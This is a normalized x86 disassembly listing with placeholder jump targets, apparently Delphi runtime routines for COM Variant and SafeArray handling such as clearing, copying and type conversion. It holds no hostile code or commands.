inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40eb04
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40eb60
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e9a8
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e9a8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ead4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e9a8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e9a8
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40eb04
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e9a8
mov eax [ ebp - 0x314 ]
call sub_40ed58
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ecdc
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e9a8
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404008
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_41426c
test al al
je r-xdata
mov eax ebx
call sub_40eb60
jmp r-xdata
push ebx
call VariantClear
call sub_40e9a8
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ed74
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40eda4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40eda4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ee00
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e9a8
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e9a8
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40ed58
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e700
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e9a8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e9a8
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ed74
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40eda4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e9a8
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e9a8
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40efd4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ecdc
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e9a8
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40405c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_41426c
test al al
je r-xdata
mov ecx sub_40efcc
mov edx esi
mov eax ebx
call sub_40ee00
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e9a8
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f080
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40efd4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ecdc
sub_40f0c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f120
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f080
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f34c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f127
lea eax [ ebp - 0x10 ]
call sub_40ed58
retn
sub_40f130
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f16e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412798
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413148
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f175
lea eax [ ebp - 0x4 ]
call sub_4046e8
retn
sub_40f17c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f1ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412070
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41311c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f1c1
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40f1c8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f206
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412e3c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4131ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f20d
lea eax [ ebp - 0x4 ]
call sub_405874
retn
sub_40f214
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f252
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412d70
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f259
lea eax [ ebp - 0x4 ]
call sub_405874
retn
sub_40f260
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f34c
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40e9b4
jmp r-xdata
mov edx esi
call sub_40e520
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40e9b4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f2e0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_41426c
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f0c4
jmp r-xdata
mov edx esp
mov eax esi
call sub_41426c
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f260
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f34c
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f080
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f34c
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f391 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f17c
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40eac0
jmp r-xdata
mov eax ebx
call sub_40fcb8
mov edx eax
mov eax esi
call sub_412fc4
jmp r-xdata
mov eax ebx
call sub_40f710
mov edx eax
mov eax esi
call sub_412f24
jmp r-xdata
mov eax ebx
call sub_41107c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413010
jmp r-xdata
mov eax ebx
call sub_410ce4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413034
jmp r-xdata
mov eax ebx
call sub_4119bc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413060
jmp r-xdata
mov eax ebx
call sub_411454
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_41308c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f130
jmp r-xdata
mov eax ebx
call sub_4107d0
mov edx eax
mov eax esi
call sub_4130b8
jmp r-xdata
mov eax ebx
call sub_40fb60
mov edx eax
mov eax esi
call sub_412fa4
jmp r-xdata
mov eax ebx
call sub_40fc10
mov edx eax
mov eax esi
call sub_412f44
jmp r-xdata
mov eax ebx
call sub_40fdb0
mov edx eax
mov eax esi
call sub_412f64
jmp r-xdata
mov eax ebx
call sub_40fe88
mov edx eax
mov eax esi
call sub_412f84
jmp r-xdata
mov eax ebx
call sub_4101d4
push edx
push eax
mov eax esi
call sub_412fe4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f1c8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f214
jmp r-xdata
mov dx 0x101
call sub_40e520
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40ed58
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f2e0
xor edx edx
mov ax 0x1
call sub_40e520
jmp r-xdata
sub_40f578
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f61b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412798
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404290
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_4081c0
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f622
lea eax [ ebp - 0xc ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_4046e8
retn
mov eax ebx
call sub_4107d0
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40e9b4
jmp r-xdata
sub_40f62c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40e9b4
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40f668
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f6bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f080
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40f710
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f6c3
lea eax [ ebp - 0x14 ]
call sub_40ed58
retn
sub_40f6cc
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41426c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40f710
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40fb31
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f743 ]
mov eax [ ebp - 0x4 ]
call sub_40f578
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a9c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a9c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402a9c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a9c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f578
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f710
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f62c
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f668
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e520
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f6cc
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f62c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40f62c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40f967 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a9c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a9c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402a9c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a9c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f578
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f710
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031d0
sub_40fb60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e520
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fbec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f710
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031d0
sub_40fc10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e520
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fc93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f710
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031d0
sub_40fcb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_40fd8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f710
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fcde ]
jmp [ eax * 4 + jump_table_40fcf0 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031d0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e520
sub_40fdb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_40fe65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f710
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fdd2 ]
jmp [ eax * 4 + jump_table_40fde5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031d0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
